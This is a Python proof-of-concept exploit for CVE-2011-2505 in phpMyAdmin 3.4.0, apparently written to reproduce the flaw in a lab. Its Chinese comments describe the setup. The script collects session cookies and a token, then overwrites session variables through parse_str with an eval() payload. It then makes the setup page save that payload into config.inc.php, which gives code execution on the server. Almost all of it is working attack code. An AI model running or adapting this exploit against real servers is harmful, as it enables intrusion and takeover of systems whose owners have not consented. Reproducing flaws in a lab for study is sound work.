# -*- encoding: utf-8 -*-

"""
@author: d00ms(--)
@file: cve-2011-2505.py
@time: 2019-5-20 10:37
@desc: An poc of phpMyAdmin variables overwrite vulnerable.
"""

#####
#   写在前面：
#       之前复现过两次，还拿官方poc验证过，均失败了。
#       这次仔细研读了《白帽子讲web安全》部分的exploit，自己抓包分析了过程
#       应该还是环境问题，这次再来复现一下。
#   环境配置：
#       phpMyAdmin:3.4.0
#       Ubuntu的Apache2默认用户|组：www-data~www-data
#       PHP5的cli设置php.ini：session.auto_start = 1
#####

import re
from urllib import request
from urllib import parse

target = 'http://10.10.10.108/pma/'

def parseCookie(pattern, header):
    res = re.findall('{}=([^;]+)'.format(pattern),header)
    return res[-1]

def main():
    ################################################################
    print('Step1: request first page and get token & phpMyAdmin:')
    obj = request.urlopen(target+'index.php')

    # 这个版本中，phpMyAdmin参数放在了Cookie里
    cookie = obj.getheader("Set-Cookie")
    # then extract the necessary headers we need
    pma_lang = parseCookie('pma_lang', cookie)
    pma_mcrypt_iv = parseCookie('pma_mcrypt_iv', cookie)
    phpMyAdmin = parseCookie('phpMyAdmin', cookie)
    pma_collation= parseCookie('pma_collation_connection', cookie)

    content = obj.read()
    token = re.search('token=([^"&]+)', content.decode('utf-8')).group(1)
    print('\ttoken={}; phpMyAdmin={}; '.format(token, phpMyAdmin))
    ################################################################

    print('Step2: send payload to swekey.auth.lib.php for using parse_str() to cover variables')
    payload = {"session_to_unset":123,"token":token,
               "_SESSION[ConfigFile][Servers][*/eval('echo phpinfo();');/*][host]":"Hacking"}
    proxyHandler = request.ProxyHandler({'http':'http://127.0.0.1:8080'})
    opener = request.build_opener(proxyHandler)
    opener.addheaders.append(('Cookie',"pma_lang={}; pma_mcrypt_iv={}; security_level=0; phpMyAdmin={}; pma_collation_connection={}".format(
           pma_lang, pma_mcrypt_iv, phpMyAdmin, pma_collation)))
    request.install_opener(opener)
    try:
        request.urlopen(target+'db_create.php?'+parse.urlencode(payload))
    except Exception as e:
        print('%s ---- But we just request it and update the session!' % e)

    '''
    try:
        request.urlopen(target+'db_create.php'+payload)
    except Exception as e:
        print('Exception: %s'%e)
    '''
    ################################################################

    # 这一步可以实现，直接写入代码保存。
    print('Step3: visit setup/config.php to omit save file to config/config.inc.php')
    print('Now save data to config file...')
    postdata = "tab_hash=&check_page_refresh=&token=%s&eol=unix&DefaultLang=en&ServerDefault=0&submit_save=Save"%(token)
    opener.addheaders.append(('Referer','http://10.10.10.108/pma/setup/index.php?page=config'))
    request.install_opener(opener)
    obj = request.urlopen(target+'setup/config.php',data=postdata.encode('utf8'))
    print('Response status: %d'%obj.status)
    ################################################################

    print('Step4: visit config/config.inc.php to verify the result')


if __name__ == '__main__':
    main()